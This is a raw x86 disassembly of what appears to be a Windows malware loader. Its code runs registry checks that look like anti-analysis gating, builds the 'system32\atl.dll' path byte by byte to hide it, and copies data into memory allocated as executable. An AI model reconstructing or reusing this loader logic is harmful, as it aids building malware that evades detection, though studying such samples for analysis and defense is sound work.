0x00401010:	pushl	%ebp	; from: 0x0040154a(MAY)
0x00401011:	movl	%esp, %ebp
0x00401013:	subl	$0x8, %esp
0x00401016:	movl	0x8(%ebp), %eax
0x00401019:	movl	%eax, -4(%ebp)
0x0040101c:	movl	0xc(%ebp), %ecx
0x0040101f:	movl	%ecx, -8(%ebp)
0x00401022:	movl	-4(%ebp), %edx
0x00401025:	cmpl	-8(%ebp), %edx
0x00401028:	jae	0x00401031	; targets: 0x0040102a(MAY)
0x0040102a:	movl	-4(%ebp), %eax	; from: 0x00401028(MAY)
0x0040102d:	jmp	0x00401034	; targets: 0x00401034(MAY)
0x00401034:	movl	%ebp, %esp	; from: 0x0040102d(MAY)
0x00401036:	popl	%ebp
0x00401037:	ret	; targets: 0x0040154f(MAY)

0x00401040:	pushl	%ebp	; from: 0x00401516(MAY)
0x00401041:	movl	%esp, %ebp
0x00401043:	popl	%ebp
0x00401044:	ret	; targets: 0x0040151b(MAY)

0x00401050:	pushl	%ebp	; from: 0x0040143d(MAY)
0x00401051:	movl	%esp, %ebp
0x00401053:	movl	0x00402014, %eax
0x00401058:	movb	$0x73, 0x3(%eax)
0x0040105c:	movl	0x00402014, %ecx
0x00401062:	movb	$0x74, 0x4(%ecx)
0x00401066:	movl	0x00402014, %edx
0x0040106c:	movb	$0x65, 0x5(%edx)
0x00401070:	movl	0x00402014, %eax
0x00401075:	movb	$0x6d, 0x6(%eax)
0x00401079:	movl	0x00402014, %ecx
0x0040107f:	movb	$0x33, 0x7(%ecx)
0x00401083:	movl	0x00402014, %edx
0x00401089:	movb	$0x32, 0x8(%edx)
0x0040108d:	movl	0x00402014, %eax
0x00401092:	movb	$0x5c, 0x9(%eax)
0x00401096:	movl	0x00402014, %ecx
0x0040109c:	movb	$0x61, 0xa(%ecx)
0x004010a0:	movl	0x00402014, %edx
0x004010a6:	movb	$0x74, 0xb(%edx)
0x004010aa:	movl	0x00402014, %eax
0x004010af:	movb	$0x6c, 0xc(%eax)
0x004010b3:	movl	0x00402014, %ecx
0x004010b9:	movb	$0x2e, 0xd(%ecx)
0x004010bd:	movl	0x00402014, %edx
0x004010c3:	movb	$0x64, 0xe(%edx)
0x004010c7:	movl	0x00402014, %eax
0x004010cc:	movb	$0x6c, 0xf(%eax)
0x004010d0:	movl	0x00402014, %ecx
0x004010d6:	movb	$0x6c, 0x10(%ecx)
0x004010da:	movl	0x00402014, %edx
0x004010e0:	movb	$0x5c, (%edx)
0x004010e3:	movl	0x00402014, %eax
0x004010e8:	movb	$0x73, 0x1(%eax)
0x004010ec:	movl	0x00402014, %ecx
0x004010f2:	movb	$0x79, 0x2(%ecx)
0x004010f6:	popl	%ebp
0x004010f7:	ret	; targets: 0x00401442(MAY)

0x004011c0:	pushl	%ebp	; from: 0x00401449(MAY)
0x004011c1:	movl	%esp, %ebp
0x004011c3:	movl	0x8(%ebp), %eax
0x004011c6:	movl	-4(%eax), %eax
0x004011c9:	popl	%ebp
0x004011ca:	ret	; targets: 0x0040144e(MAY)

0x004011d0:	pushl	%ebp	; from: 0x004014f8(MAY)
0x004011d1:	movl	%esp, %ebp
0x004011d3:	subl	$0x8, %esp
0x004011d6:	movl	$0x19c, -4(%ebp)
0x004011dd:	movl	VirtualAlloc@kernel32.dll, %eax
0x004011e2:	movl	%eax, -8(%ebp)
0x004011e5:	pushl	$0x40
0x004011e7:	pushl	$0x3000
0x004011ec:	movl	0x8(%ebp), %ecx
0x004011ef:	pushl	%ecx
0x004011f0:	pushl	$0x0
0x004011f2:	call	-8(%ebp)	; targets: 0xff000020(MAY)
0x004011f5:	movl	%ebp, %esp
0x004011f7:	popl	%ebp
0x004011f8:	ret	; targets: 0x004014fd(MAY)

0x00401290:	pushl	%ebp	; from: 0x00401579(MAY)
0x00401291:	movl	%esp, %ebp
0x00401293:	subl	$0x8, %esp
0x00401296:	movl	$0x52f3, -4(%ebp)
0x0040129d:	movl	$0x52f3, -4(%ebp)
0x004012a4:	movl	$0x0, 0x00417c98
0x004012ae:	jmp	0x004012bd	; targets: 0x004012bd(MAY)
0x004012b0:	movl	0x00417c98, %eax	; from: 0x004012fa(MAY)
0x004012b5:	addl	$0x1, %eax
0x004012b8:	movl	%eax, 0x00417c98
0x004012bd:	movl	0x00417c98, %ecx	; from: 0x004012ae(MAY)
0x004012c3:	cmpl	0x10(%ebp), %ecx
0x004012c6:	jae	0x004012fc	; targets: 0x004012c8(MAY), 0x004012fc(MAY)
0x004012c8:	movl	$0x52f3, -4(%ebp)	; from: 0x004012c6(MAY)
0x004012cf:	movl	0xc(%ebp), %edx
0x004012d2:	addl	0x00417c98, %edx
0x004012d8:	movzbl	(%edx), %eax
0x004012db:	movl	%eax, -8(%ebp)
0x004012de:	movl	$0x86, -4(%ebp)
0x004012e5:	movl	0x8(%ebp), %ecx
0x004012e8:	addl	0x00417c98, %ecx
0x004012ee:	movb	-8(%ebp), %dl
0x004012f1:	movb	%dl, (%ecx)
0x004012f3:	movl	$0x52f3, -4(%ebp)
0x004012fa:	jmp	0x004012b0	; targets: 0x004012b0(MAY)
0x004012fc:	movl	%ebp, %esp	; from: 0x004012c6(MAY)
0x004012fe:	popl	%ebp
0x004012ff:	ret	; targets: unresolved


start:
0x00401300:	pushl	%ebp
0x00401301:	movl	%esp, %ebp
0x00401303:	subl	$0x174, %esp
0x00401309:	pusha	
0x0040130a:	movl	%ebp, 0x00417c9c
0x00401310:	movl	$0x0, -328(%ebp)
0x0040131a:	leal	-296(%ebp), %eax
0x00401320:	pushl	%eax
0x00401321:	pushl	$0x20019
0x00401326:	pushl	$0x0
0x00401328:	pushl	$0x40206c
0x0040132d:	pushl	$0x80000002
0x00401332:	call	RegOpenKeyExW@advapi32.dll	; targets: 0xff000060(MAY)
0x00401338:	testl	%eax, %eax
0x0040133a:	je	0x0040134b	; targets: 0x0040133c(MAY), 0x0040134b(MAY)
0x0040133c:	pushl	$0x4	; from: 0x0040133a(MAY)
0x0040133e:	call	LoadLibraryW@kernel32.dll	; targets: 0xff000040(MAY)
0x00401344:	xorl	%eax, %eax
0x00401346:	jmp	0x0040178c	; targets: 0x0040178c(MAY)
0x0040134b:	leal	-296(%ebp), %ecx	; from: 0x0040133a(MAY)
0x00401351:	pushl	%ecx
0x00401352:	pushl	$0x20019
0x00401357:	pushl	$0x0
0x00401359:	pushl	$0x402080
0x0040135e:	movl	-296(%ebp), %edx
0x00401364:	pushl	%edx
0x00401365:	call	RegOpenKeyExW@advapi32.dll	; targets: 0xff000060(MAY)
0x0040136b:	testl	%eax, %eax
0x0040136d:	je	0x0040137e	; targets: 0x0040136f(MAY), 0x0040137e(MAY)
0x0040136f:	pushl	$0x4	; from: 0x0040136d(MAY)
0x00401371:	call	LoadLibraryW@kernel32.dll	; targets: 0xff000040(MAY)
0x00401377:	xorl	%eax, %eax
0x00401379:	jmp	0x0040178c	; targets: 0x0040178c(MAY)
0x0040137e:	leal	-296(%ebp), %eax	; from: 0x0040136d(MAY)
0x00401384:	pushl	%eax
0x00401385:	pushl	$0x20019
0x0040138a:	pushl	$0x0
0x0040138c:	pushl	$0x402090
0x00401391:	movl	-296(%ebp), %ecx
0x00401397:	pushl	%ecx
0x00401398:	call	RegOpenKeyExW@advapi32.dll	; targets: 0xff000060(MAY)
0x0040139e:	testl	%eax, %eax
0x004013a0:	je	0x004013b1	; targets: 0x004013a2(MAY), 0x004013b1(MAY)
0x004013a2:	pushl	$0x4	; from: 0x004013a0(MAY)
0x004013a4:	call	LoadLibraryW@kernel32.dll	; targets: 0xff000040(MAY)
0x004013aa:	xorl	%eax, %eax
0x004013ac:	jmp	0x0040178c	; targets: 0x0040178c(MAY)
0x004013b1:	movl	CreateFileA@kernel32.dll, %edx	; from: 0x004013a0(MAY)
0x004013b7:	movl	%edx, -348(%ebp)
0x004013bd:	movl	$0x40251c, -312(%ebp)
0x004013c7:	movl	$0x0, -276(%ebp)
0x004013d1:	movl	$0x64, -320(%ebp)
0x004013db:	movl	$0x1, -284(%ebp)
0x004013e5:	movl	$0x0, -328(%ebp)
0x004013ef:	movl	$0x0, -292(%ebp)
0x004013f9:	movl	$0x1, -316(%ebp)
0x00401403:	movl	$0x0, -328(%ebp)
0x0040140d:	movl	$0x0, -292(%ebp)
0x00401417:	movl	$0x1, -316(%ebp)
0x00401421:	movl	$0x3, -280(%ebp)
0x0040142b:	pushl	$0x104
0x00401430:	leal	-272(%ebp), %eax
0x00401436:	pushl	%eax
0x00401437:	call	GetWindowsDirectoryA@kernel32.dll	; targets: 0xff000070(MAY)
0x0040143d:	call	0x00401050	; targets: 0x00401050(MAY)
0x00401442:	movl	-312(%ebp), %ecx	; from: 0x004010f7(MAY)
0x00401448:	pushl	%ecx
0x00401449:	call	0x004011c0	; targets: 0x004011c0(MAY)
0x0040144e:	addl	$0x4, %esp	; from: 0x004011ca(MAY)
0x00401451:	movl	%eax, -332(%ebp)
0x00401457:	leal	-296(%ebp), %edx
0x0040145d:	pushl	%edx
0x0040145e:	pushl	$0x20019
0x00401463:	pushl	$0x0
0x00401465:	pushl	$0x4020b0
0x0040146a:	movl	-296(%ebp), %eax
0x00401470:	pushl	%eax
0x00401471:	call	RegOpenKeyExW@advapi32.dll	; targets: 0xff000060(MAY)
0x00401477:	testl	%eax, %eax
0x00401479:	je	0x0040148a	; targets: 0x0040147b(MAY), 0x0040148a(MAY)
0x0040147b:	pushl	$0x4	; from: 0x00401479(MAY)
0x0040147d:	call	LoadLibraryW@kernel32.dll	; targets: 0xff000040(MAY)
0x00401483:	xorl	%eax, %eax
0x00401485:	jmp	0x0040178c	; targets: 0x0040178c(MAY)
0x0040148a:	movl	0x00402014, %ecx	; from: 0x00401479(MAY)
0x00401490:	pushl	%ecx
0x00401491:	leal	-272(%ebp), %edx
0x00401497:	pushl	%edx
0x00401498:	call	lstrlenA@kernel32.dll	; targets: 0xff000010(MAY)
0x0040149e:	leal	-272(%ebp,%eax), %eax
0x004014a5:	pushl	%eax
0x004014a6:	call	lstrcpyA@kernel32.dll	; targets: 0xff000030(MAY)
0x004014ac:	pushl	$0x0
0x004014ae:	pushl	$0x80
0x004014b3:	pushl	$0x3
0x004014b5:	pushl	$0x0
0x004014b7:	movl	-280(%ebp), %ecx
0x004014bd:	pushl	%ecx
0x004014be:	movl	-316(%ebp), %edx
0x004014c4:	pushl	%edx
0x004014c5:	leal	-272(%ebp), %eax
0x004014cb:	pushl	%eax
0x004014cc:	call	-348(%ebp)	; targets: 0xff000050(MAY)
0x004014d2:	movl	%eax, -300(%ebp)
0x004014d8:	cmpl	$0xffffffff, -300(%ebp)
0x004014df:	je	0x004014ea	; targets: 0x004014ea(MAY), 0x004014e1(MAY)
0x004014e1:	cmpl	$0x0, -300(%ebp)	; from: 0x004014df(MAY)
0x004014e8:	jne	0x004014f1	; targets: 0x004014ea(MAY), 0x004014f1(MAY)
0x004014ea:	xorl	%eax, %eax	; from: 0x004014e8(MAY), 0x004014df(MAY)
0x004014ec:	jmp	0x0040178c	; targets: 0x0040178c(MAY)
0x004014f1:	movl	-332(%ebp), %ecx	; from: 0x004014e8(MAY)
0x004014f7:	pushl	%ecx
0x004014f8:	call	0x004011d0	; targets: 0x004011d0(MAY)
0x004014fd:	addl	$0x4, %esp	; from: 0x004011f8(MAY)
0x00401500:	movl	%eax, -324(%ebp)
0x00401506:	movl	-332(%ebp), %edx
0x0040150c:	pushl	%edx
0x0040150d:	pushl	$0x0
0x0040150f:	movl	-324(%ebp), %eax
0x00401515:	pushl	%eax
0x00401516:	call	0x00401040	; targets: 0x00401040(MAY)
0x0040151b:	addl	$0xc, %esp	; from: 0x00401044(MAY)
0x0040151e:	movl	-332(%ebp), %ecx
0x00401524:	movl	%ecx, -340(%ebp)
0x0040152a:	movl	-328(%ebp), %edx
0x00401530:	cmpl	-332(%ebp), %edx
0x00401536:	jae	0x004015c2	; targets: 0x0040153c(MAY)
0x0040153c:	movl	-340(%ebp), %eax	; from: 0x00401536(MAY)
0x00401542:	pushl	%eax
0x00401543:	movl	-320(%ebp), %ecx
0x00401549:	pushl	%ecx
0x0040154a:	call	0x00401010	; targets: 0x00401010(MAY)
0x0040154f:	addl	$0x8, %esp	; from: 0x00401037(MAY)
0x00401552:	movl	%eax, -344(%ebp)
0x00401558:	movl	-344(%ebp), %edx
0x0040155e:	pushl	%edx
0x0040155f:	movl	-312(%ebp), %eax
0x00401565:	addl	-292(%ebp), %eax
0x0040156b:	pushl	%eax
0x0040156c:	movl	-324(%ebp), %ecx
0x00401572:	addl	-328(%ebp), %ecx
0x00401578:	pushl	%ecx
0x00401579:	call	0x00401290	; targets: 0x00401290(MAY)
0x0040178c:	movl	%ebp, %esp	; from: 0x00401379(MAY), 0x004014ec(MAY), 0x004013ac(MAY), 0x00401485(MAY), 0x00401346(MAY)
0x0040178e:	popl	%ebp
0x0040178f:	ret	; targets: 0xfee70000(MAY)

